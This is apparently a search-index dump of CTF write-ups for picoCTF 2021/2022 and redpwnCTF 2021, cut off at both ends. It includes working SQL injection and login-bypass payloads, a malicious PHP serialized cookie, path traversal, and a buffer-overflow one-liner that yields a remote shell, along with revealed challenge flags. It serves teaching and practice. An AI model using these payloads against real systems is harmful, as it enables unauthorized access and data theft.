you create a dummy webhook) create a curl request with user-token cookie so your authorized and your payload should be in same structure as you noticed with dummy i. e {url: , body: , contentType} For url use your URL that you have created, body is your base64 string you created and contentType is what you copied from wireshark that looks like /git-packet something","title":"Step5: Adding webhook"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step6-magicccccc","text":"Now you have set the trap, Time to trigger it clone the repo for which you have added the webhook create a random commit like adding \"# 69\" to readme git push","title":"Step6: Magicccccc"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/bithug/#step7-the-flag","text":"Go to instanceURL/_/username.git Note: When I means .git i mean your username like admin.git, applies to all places I mentioned it.","title":"Step7: THE FLAG"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/cookies/","text":"Cookies \u00b6 Looking at the website provided, if we try and enter an arbitrary input, it would prompt us that the input is invalid. However, if we use the placeholder text snickerdoodle we see that it gives us a page where the text is set to I love snickerdoodle cookies! . Method \u00b6 Looking at the cookie set after entering snickerdoodle we see that it has a value of 0. By testing around and changing the cookie value to 1 , 2 etc. we see that it outputs a different name. My guess is that a certain cookie value will return us the flag. Script \u00b6 This script uses python requests to loop through 1-20 and set that as our cookie. Then we send the post request and see what it returns. If something unusual(does not contain I love ), we found our flag.","title":"Cookies"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/cookies/#cookies","text":"Looking at the website provided, if we try and enter an arbitrary input, it would prompt us that the input is invalid. However, if we use the placeholder text snickerdoodle we see that it gives us a page where the text is set to I love snickerdoodle cookies! .","title":"Cookies"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/cookies/#method","text":"Looking at the cookie set after entering snickerdoodle we see that it has a value of 0. By testing around and changing the cookie value to 1 , 2 etc. we see that it outputs a different name. My guess is that a certain cookie value will return us the flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/cookies/#script","text":"This script uses python requests to loop through 1-20 and set that as our cookie. Then we send the post request and see what it returns. If something unusual(does not contain I love ), we found our flag.","title":"Script"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/more_cookies/","text":"More Cookies \u00b6 Credits to @ZeroDayTea Somehow, thats challenge was way harder than the most cookies challenge. The important observation that the cookie is encrypted using AES-CBC which is this case, is vulnerable to a bit-flipping attack. Reference Method \u00b6 By looking at the cookie, we see that it's format is actually admin = 0 which means that we only need to flip one bit and make that a 1 . We see that every character in the base64 cookie will equal to one byte in the ciphertext which by changing we can modify the plaintext. This is because the cookie is encrypted then base64 encoded. Using a bruteforce solution, switching out every byte in the original session cookie will result us in the flag. By using python multithreading, we get the flag almost instantly.","title":"More Cookies"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/more_cookies/#more-cookies","text":"Credits to @ZeroDayTea Somehow, thats challenge was way harder than the most cookies challenge. The important observation that the cookie is encrypted using AES-CBC which is this case, is vulnerable to a bit-flipping attack. Reference","title":"More Cookies"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/more_cookies/#method","text":"By looking at the cookie, we see that it's format is actually admin = 0 which means that we only need to flip one bit and make that a 1 . We see that every character in the base64 cookie will equal to one byte in the ciphertext which by changing we can modify the plaintext. This is because the cookie is encrypted then base64 encoded. Using a bruteforce solution, switching out every byte in the original session cookie will result us in the flag. By using python multithreading, we get the flag almost instantly.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/most_cookies/","text":"Most Cookies \u00b6 This challenge uses flask as the backend framework to set user cookies which we know is prone to forgery attacks. Intuition \u00b6 Looking at the source code, we see that the cookie generation secret key is just a random choice out of a small set of strings. This means that we could easily brute-force the cookie by trying every key on our desired payload. Method \u00b6 flask-session-cookie-manager provides a complete set of scripts to encode and decode cookies. By grabbing those, we are able to create cookies programmatically with python. Using requests, we send those cookies off and monitor the returning webpage.","title":"Most Cookies"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/most_cookies/#most-cookies","text":"This challenge uses flask as the backend framework to set user cookies which we know is prone to forgery attacks.","title":"Most Cookies"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/most_cookies/#intuition","text":"Looking at the source code, we see that the cookie generation secret key is just a random choice out of a small set of strings. This means that we could easily brute-force the cookie by trying every key on our desired payload.","title":"Intuition"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/most_cookies/#method","text":"flask-session-cookie-manager provides a complete set of scripts to encode and decode cookies. By grabbing those, we are able to create cookies programmatically with python. Using requests, we send those cookies off and monitor the returning webpage.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/scavenger_hunt/","text":"Scavenger Hunt \u00b6 Credits to @BC534211 Basically looking for breadcrumbs in different files. first part of the flag (in index.html file) picoCTF{t second part (in mycss.css file) h4ts_4_l0 third (http://mercury.picoctf.net:39698/robots.txt) t_0f_pl4c 4th (http://mercury.picoctf.net:39698/.htaccess) 3s_2_lO0k 5th (hint = .DS_Store) _fa04427c} picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_fa04427c}","title":"Scavenger Hunt"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/scavenger_hunt/#scavenger-hunt","text":"Credits to @BC534211 Basically looking for breadcrumbs in different files. first part of the flag (in index.html file) picoCTF{t second part (in mycss.css file) h4ts_4_l0 third (http://mercury.picoctf.net:39698/robots.txt) t_0f_pl4c 4th (http://mercury.picoctf.net:39698/.htaccess) 3s_2_lO0k 5th (hint = .DS_Store) _fa04427c} picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_fa04427c}","title":"Scavenger Hunt"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/some_assembly_required_1/","text":"Some Assembly Required 1 \u00b6 N/A","title":"Some Assembly Required 1"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/some_assembly_required_1/#some-assembly-required-1","text":"N/A","title":"Some Assembly Required 1"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/some_assembly_required_3/","text":"Some Assembly Required 2 \u00b6 N/A","title":"Some Assembly Required 2"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/some_assembly_required_3/#some-assembly-required-2","text":"N/A","title":"Some Assembly Required 2"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/some_assembly_required_4/","text":"Some Assembly Required 4 \u00b6 N/A","title":"Some Assembly Required 4"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/some_assembly_required_4/#some-assembly-required-4","text":"N/A","title":"Some Assembly Required 4"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/startup_company/","text":"Startup Company \u00b6 This is a SQLi challenge that involves leaking table data in order to find the flag. I Registered for an account and entered the payload into the donation input bar by removing it's number only class via the debug console and I get an database error . Now what? Method \u00b6 We are supposed to extract table names and stuff using SQLi Reffer to Empire 1 from pico2019 Payloads and Leaks \u00b6 payload '||(select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||' leak startup_users We see that we found a table called startup_users payload '||(select tbl_name FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE)||' leak none We see that startup_users is the only table in the database. payload '||(select sql FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||' leak $CREATE TABLE startup_users (nameuser text, wordpass text, money int) We leak the SQL structure of the table in which we can see the wordpass column stands out. payload '||(select wordpass FROM startup_users where wordpass like '%picoCTF%' limit 0,1 COLLATE NOCASE)||' leak picoCTF{1_c4nn0t_s33_y0u_55fb70fa} We have leaked the word_pass column data.","title":"Startup Company"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/startup_company/#startup-company","text":"This is a SQLi challenge that involves leaking table data in order to find the flag. I Registered for an account and entered the payload into the donation input bar by removing it's number only class via the debug console and I get an database error . Now what?","title":"Startup Company"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/startup_company/#method","text":"We are supposed to extract table names and stuff using SQLi Reffer to Empire 1 from pico2019","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/startup_company/#payloads-and-leaks","text":"payload '||(select tbl_name FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||' leak startup_users We see that we found a table called startup_users payload '||(select tbl_name FROM sqlite_master WHERE type='table' limit 1,1 COLLATE NOCASE)||' leak none We see that startup_users is the only table in the database. payload '||(select sql FROM sqlite_master WHERE type='table' limit 0,1 COLLATE NOCASE)||' leak $CREATE TABLE startup_users (nameuser text, wordpass text, money int) We leak the SQL structure of the table in which we can see the wordpass column stands out. payload '||(select wordpass FROM startup_users where wordpass like '%picoCTF%' limit 0,1 COLLATE NOCASE)||' leak picoCTF{1_c4nn0t_s33_y0u_55fb70fa} We have leaked the word_pass column data.","title":"Payloads and Leaks"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/super_serial/","text":"Super Serial \u00b6 Theres actually 2 ways of solving this challenge in which the second one is probably the intended way but the first one is extremely easy to execute. Method 1 \u00b6 Credits to @ZeroDayTea Looking at the hint we see that the flag is located at ../flag all we need to do is url encode ../flag and append that to the URL, basically performing a path traversal attack. Object Serialization \u00b6 This is probably the intended way since the name of the challenge hints so. By looking at the robots.txt file we get a hint that .phps files exist, and true enough, appending s so all pages we see the source php code. Looking at the code we can see something interesting in this block: if(isset($_COOKIE[\"login\"])){ try{ $perm = unserialize(base64_decode(urldecode($_COOKIE[\"login\"]))); $g = $perm->is_guest(); $a = $perm->is_admin(); } catch(Error $e){ die(\"Deserialization error. \".$perm); } } We see that we are trying to deserialize user provided data which could lead to some sort of exploit, more, we see that if it errors, we print the object on the screen. Taking a deeper look we see that the access_log class has a magic function _toString which reads any file that you input. This means that if we get the try block to error, the die statement will try and call the _toString method of a access_log object will give us access to ../flag Payload \u00b6 Set the cookie to TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 . This is a access log object pointing to ../flag after serialization, base64 encoding and url encoding.","title":"Super Serial"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/super_serial/#super-serial","text":"Theres actually 2 ways of solving this challenge in which the second one is probably the intended way but the first one is extremely easy to execute.","title":"Super Serial"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/super_serial/#method-1","text":"Credits to @ZeroDayTea Looking at the hint we see that the flag is located at ../flag all we need to do is url encode ../flag and append that to the URL, basically performing a path traversal attack.","title":"Method 1"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/super_serial/#object-serialization","text":"This is probably the intended way since the name of the challenge hints so. By looking at the robots.txt file we get a hint that .phps files exist, and true enough, appending s so all pages we see the source php code. Looking at the code we can see something interesting in this block: if(isset($_COOKIE[\"login\"])){ try{ $perm = unserialize(base64_decode(urldecode($_COOKIE[\"login\"]))); $g = $perm->is_guest(); $a = $perm->is_admin(); } catch(Error $e){ die(\"Deserialization error. \".$perm); } } We see that we are trying to deserialize user provided data which could lead to some sort of exploit, more, we see that if it errors, we print the object on the screen. Taking a deeper look we see that the access_log class has a magic function _toString which reads any file that you input. This means that if we get the try block to error, the die statement will try and call the _toString method of a access_log object will give us access to ../flag","title":"Object Serialization"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/super_serial/#payload","text":"Set the cookie to TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 . This is a access log object pointing to ../flag after serialization, base64 encoding and url encoding.","title":"Payload"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/web_gauntlet_2/","text":"SQL Injection \u00b6 this payload ' || ''-' got this output SELECT username, password FROM users WHERE username='' || ''-'' AND password='' || ''-'' SELECT username, password FROM users WHERE username=''||'a'||'dmin' AND password='qd' SELECT username, password FROM users WHERE username='a'||'dmin' AND password='qd' concat not working for some reason so this works for the admin part SELECT username , password FROM users WHERE username = 'adm' || 'in' AND password = 'arast' IS NOT 'a' IS 'a' Available SQL Operators \u00b6 + addition - subtraction % modulus BETWEEN EXISTS IN NOT IN LIKE GLOB NOT OR IS NULL IS IS NOT || UNIQUE | bitwise or & bitwise and Payload \u00b6 username: ad'||'min password: a' IS NOT 'b","title":"SQL Injection"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/web_gauntlet_2/#sql-injection","text":"this payload ' || ''-' got this output SELECT username, password FROM users WHERE username='' || ''-'' AND password='' || ''-'' SELECT username, password FROM users WHERE username=''||'a'||'dmin' AND password='qd' SELECT username, password FROM users WHERE username='a'||'dmin' AND password='qd' concat not working for some reason so this works for the admin part SELECT username , password FROM users WHERE username = 'adm' || 'in' AND password = 'arast' IS NOT 'a' IS 'a'","title":"SQL Injection"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/web_gauntlet_2/#available-sql-operators","text":"+ addition - subtraction % modulus BETWEEN EXISTS IN NOT IN LIKE GLOB NOT OR IS NULL IS IS NOT || UNIQUE | bitwise or & bitwise and","title":"Available SQL Operators"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/web_gauntlet_2/#payload","text":"username: ad'||'min password: a' IS NOT 'b","title":"Payload"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/web_gauntlet_3/","text":"Web Gauntlet 3 \u00b6 It seems like the payload from web_gauntlet_2 works here. This stage is supposed to add a character count to the payload but our payload from the previous questions already satisfies the filters.","title":"Web Gauntlet 3"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/web_gauntlet_3/#web-gauntlet-3","text":"It seems like the payload from web_gauntlet_2 works here. This stage is supposed to add a character count to the payload but our payload from the previous questions already satisfies the filters.","title":"Web Gauntlet 3"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/who_are_you/","text":"Who Are You! \u00b6 This seems like a request header modification question. It says use Pico Browser so I changed user agent then it says I don't trust users visiting from another site. Im guessing it has something to do with CORS but idk now Method \u00b6 It turns out that we need to satisfy multiple requirements in the header in order to get the flag. Please refer to the script.","title":"Who Are You!"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/who_are_you/#who-are-you","text":"This seems like a request header modification question. It says use Pico Browser so I changed user agent then it says I don't trust users visiting from another site. Im guessing it has something to do with CORS but idk now","title":"Who Are You!"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/who_are_you/#method","text":"It turns out that we need to satisfy multiple requirements in the header in order to get the flag. Please refer to the script.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/x_marks_the_spot/","text":"X Marks the Spot \u00b6 Looking at the hint we see that it's a XPATH injection challenge. Starting from PATT we see that we can actually leak the flag character by character by using the contains() function in the injection. Method \u00b6 The script uses the python requests module and loops through the characters to build out the flag.","title":"X Marks the Spot"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/x_marks_the_spot/#x-marks-the-spot","text":"Looking at the hint we see that it's a XPATH injection challenge. Starting from PATT we see that we can actually leak the flag character by character by using the contains() function in the injection.","title":"X Marks the Spot"},{"location":"CTF%20Writeups/picoCTF%202021/Web%20Exploitation/x_marks_the_spot/#method","text":"The script uses the python requests module and loops through the characters to build out the flag.","title":"Method"},{"location":"CTF%20Writeups/picoCTF%202021/demo/","text":"","title":"Index"},{"location":"CTF%20Writeups/picoCTF%202021/demo/caesar/","text":"","title":"Index"},{"location":"CTF%20Writeups/picoCTF%202021/demo/garden/","text":"","title":"Index"},{"location":"CTF%20Writeups/picoCTF%202021/demo/reverse/","text":"","title":"Index"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/CVE-XXXX-XXXX/","text":"","title":"CVE XXXX XXXX"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/RPS/","text":"","title":"RPS"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/basic-file-exploit/","text":"Basic File Exploit \u00b6 Description \u00b6 The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat: $ nc saturn.picoctf.net <PORT> The program's source code with the flag redacted can be downloaded here.","title":"Basic File Exploit"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/basic-file-exploit/#basic-file-exploit","text":"","title":"Basic File Exploit"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/basic-file-exploit/#description","text":"The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat: $ nc saturn.picoctf.net <PORT> The program's source code with the flag redacted can be downloaded here.","title":"Description"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/buffer-overflow-0/","text":"Buffer Overflow 0 \u00b6 Description \u00b6 Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net <PORT>","title":"Buffer Overflow 0"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/buffer-overflow-0/#buffer-overflow-0","text":"","title":"Buffer Overflow 0"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/buffer-overflow-0/#description","text":"Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net <PORT>","title":"Description"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/buffer-overflow-1/","text":"","title":"Buffer overflow 1"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/buffer-overflow-2/","text":"","title":"Buffer overflow 2"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/buffer-overflow-3/","text":"","title":"Buffer overflow 3"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/flag-leak/","text":"","title":"Flag leak"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/function-overwrite/","text":"","title":"Function overwrite"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/ropfu/","text":"","title":"Ropfu"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/solfire/","text":"","title":"Solfire"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/stack-cache/","text":"","title":"Stack cache"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/wine/","text":"","title":"Wine"},{"location":"CTF%20Writeups/picoCTF%202022/Binary%20Exploitation/x-sixty-what/","text":"","title":"X sixty what"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/backdoor/","text":"","title":"Backdoor"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/basic-mod1/","text":"","title":"Basic mod1"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/basic-mod2/","text":"","title":"Basic mod2"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/credstuff/","text":"","title":"Credstuff"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/diffie-hellman/","text":"","title":"Diffie hellman"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/morse-code/","text":"","title":"Morse code"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/nsa-backdoor/","text":"","title":"Nsa backdoor"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/rail-fence/","text":"","title":"Rail fence"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/sequences/","text":"","title":"Sequences"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/smooth/","text":"","title":"Smooth"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/substitution0/","text":"","title":"Substitution0"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/substitution1/","text":"","title":"Substitution1"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/substitution2/","text":"","title":"Substitution2"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/sum-o-primes/","text":"","title":"Sum o primes"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/transposition-trial/","text":"","title":"Transposition trial"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/very-smooth/","text":"","title":"Very smooth"},{"location":"CTF%20Writeups/picoCTF%202022/Cryptography/vigenere/","text":"","title":"Vigenere"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/eavesdrop/","text":"","title":"Eavesdrop"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/enhance/","text":"","title":"Enhance"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/file-types/","text":"","title":"File types"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/lookey-here/","text":"","title":"Lookey here"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/operation-oni/","text":"","title":"Operation oni"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/operation-orchid/","text":"","title":"Operation orchid"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/packets-primer/","text":"","title":"Packets primer"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/redaction-gone-wrong/","text":"","title":"Redaction gone wrong"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/sidechannel/","text":"","title":"Sidechannel"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/sleuthkit-apprentice/","text":"","title":"Sleuthkit apprentice"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/sleuthkit-intro/","text":"","title":"Sleuthkit intro"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/st3g0/","text":"","title":"St3g0"},{"location":"CTF%20Writeups/picoCTF%202022/Forensics/torrent-analyze/","text":"","title":"Torrent analyze"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/GDB-test-drive/","text":"","title":"GDB test drive"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/bbbbloat/","text":"","title":"Bbbbloat"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/bloat.py/","text":"","title":"Bloat.py"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/file-run1/","text":"","title":"File run1"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/file-run2/","text":"","title":"File run2"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/fresh-java/","text":"","title":"Fresh java"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/keygenme/","text":"","title":"Keygenme"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/patchme.py/","text":"","title":"Patchme.py"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/safe-opener/","text":"","title":"Safe opener"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/unpackme/","text":"","title":"Unpackme"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/unpackme.py/","text":"","title":"Unpackme.py"},{"location":"CTF%20Writeups/picoCTF%202022/Reverse%20Engineering/wizardlike/","text":"","title":"Wizardlike"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/forbidden-paths/","text":"","title":"Forbidden paths"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/includes/","text":"","title":"Includes"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/inspect-html/","text":"","title":"Inspect html"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/live-art/","text":"","title":"Live art"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/local-authority/","text":"","title":"Local authority"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/noted/","text":"","title":"Noted"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/power-cookie/","text":"","title":"Power cookie"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/roboto-sans/","text":"","title":"Roboto sans"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/search-source/","text":"","title":"Search source"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/secrets/","text":"","title":"Secrets"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/sql-direct/","text":"","title":"Sql direct"},{"location":"CTF%20Writeups/picoCTF%202022/Web%20Exploitation/sqlilite/","text":"","title":"Sqlilite"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-0/","text":"coffer-overflow-0 \u00b6 This is a typical first buffer overflow question. We were given a biary, the source code and a remote server to connect to. By Experienc \u00b6 If you often attend CTF's I would probably guess that this is just a plain buffer overflow so I just jammed the netcat server with quite some A 's and surely it gave me a shell to cat out the flag.txt The source \u00b6 The exploit here it the gets() function. The gets() function doesn't care about how many it's taking it, it just throws it on the stack, so if we have a long enought input for gets, we could overflow the constant code and change it's value. long code = 0 ; char name [ 16 ]; puts ( \"Welcome to coffer overflow, where our coffers are overfilling with bytes ;)\" ); puts ( \"What do you want to fill your coffer with?\" ); gets ( name ); The Flag \u00b6 We get a remote shell when the exploit is done, and by running ls we can see that there is a flag.txt . We could just cat out the file. cat flag.txt flag { b0ffer_0verf10w_3asy_as_123 }","title":"coffer-overflow-0"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-0/#coffer-overflow-0","text":"This is a typical first buffer overflow question. We were given a biary, the source code and a remote server to connect to.","title":"coffer-overflow-0"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-0/#by-experienc","text":"If you often attend CTF's I would probably guess that this is just a plain buffer overflow so I just jammed the netcat server with quite some A 's and surely it gave me a shell to cat out the flag.txt","title":"By Experienc"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-0/#the-source","text":"The exploit here it the gets() function. The gets() function doesn't care about how many it's taking it, it just throws it on the stack, so if we have a long enought input for gets, we could overflow the constant code and change it's value. long code = 0 ; char name [ 16 ]; puts ( \"Welcome to coffer overflow, where our coffers are overfilling with bytes ;)\" ); puts ( \"What do you want to fill your coffer with?\" ); gets ( name );","title":"The source"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-0/#the-flag","text":"We get a remote shell when the exploit is done, and by running ls we can see that there is a flag.txt . We could just cat out the file. cat flag.txt flag { b0ffer_0verf10w_3asy_as_123 }","title":"The Flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-1/","text":"coffer-overflow-1 \u00b6 This is the second buffer overflow question, we need more control over the payload this time. The source \u00b6 long code = 0 ; char name [ 16 ]; gets ( name ); if ( code == 0xcafebabe ) { system ( \"/bin/sh\" ); } This is the core functionality of the source, and it uses the gets() method again. Here we not only need to change the value of name, we also need to set it to 0xcafebabe in little edian. What we need to do is overwrite the code variable to the desired value. The exploit \u00b6 First we need to figure out the padding, which is how big is the buffer before we reach code . Here the string(char array) is allocated 16, to overflow rip we need to find rbp+0x8 . So, we can find the buffer size of 16+8=24 . This means that 32 bytes will be allocated for the function since 24 is smaller that 32. We just need to modify the last 8 bytes of the 32 hence we have a padding of 32-8=24 . Next we try to write the value 0xcafebabe , we can use pwn tools to convert it to little edian and then use python to output the payload from pwn import * print p32 ( 0xcafebabe ) Then we could redirect the output to the netcat server and we have a shell The flag \u00b6 ( python2 -c \"print 'A'*24+'\\xbe\\xba\\xfe\\xca'\" ; cat ) | nc 2020 .redpwnc.tf 31255 the cat here is to keep the shell open cat flag.txt flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}","title":"coffer-overflow-1"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-1/#coffer-overflow-1","text":"This is the second buffer overflow question, we need more control over the payload this time.","title":"coffer-overflow-1"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-1/#the-source","text":"long code = 0 ; char name [ 16 ]; gets ( name ); if ( code == 0xcafebabe ) { system ( \"/bin/sh\" ); } This is the core functionality of the source, and it uses the gets() method again. Here we not only need to change the value of name, we also need to set it to 0xcafebabe in little edian. What we need to do is overwrite the code variable to the desired value.","title":"The source"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-1/#the-exploit","text":"First we need to figure out the padding, which is how big is the buffer before we reach code . Here the string(char array) is allocated 16, to overflow rip we need to find rbp+0x8 . So, we can find the buffer size of 16+8=24 . This means that 32 bytes will be allocated for the function since 24 is smaller that 32. We just need to modify the last 8 bytes of the 32 hence we have a padding of 32-8=24 . Next we try to write the value 0xcafebabe , we can use pwn tools to convert it to little edian and then use python to output the payload from pwn import * print p32 ( 0xcafebabe ) Then we could redirect the output to the netcat server and we have a shell","title":"The exploit"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-1/#the-flag","text":"( python2 -c \"print 'A'*24+'\\xbe\\xba\\xfe\\xca'\" ; cat ) | nc 2020 .redpwnc.tf 31255 the cat here is to keep the shell open cat flag.txt flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}","title":"The flag"},{"location":"CTF%20Writeups/redpwnCTF%202021/Binary%20Exploitation/coffer-overflow-2/","text":"coffer-overflow-2 \u00b6 This is the 3rd buffer overflow challeng, and it couldn't be done without some gdb . The source \u00b6 int main ( void ){ char name [ 16 ]; gets ( name ); } void binFunction () { system ( \"/bin/sh\" ); } As you can see, we don't get another variable for us to overflow, instead we have a function in outside main. This case, we want to alter the rip registerto the address of binFunction() so we can get that running. First of all, we need to find the return address of main and the address of binFunction() Finding Addresses (manual) \u00b6 We can use gdb to help us. gdb info functinos binFunction 0x00000000004006e6 The exploit \u00b6 I wrote a python script(for this one, to automate it) to find the binFunction address and automatically generate and send the payload. from pwn import * import sys context ( os = 'linux' , arch = 'i386' ) local = 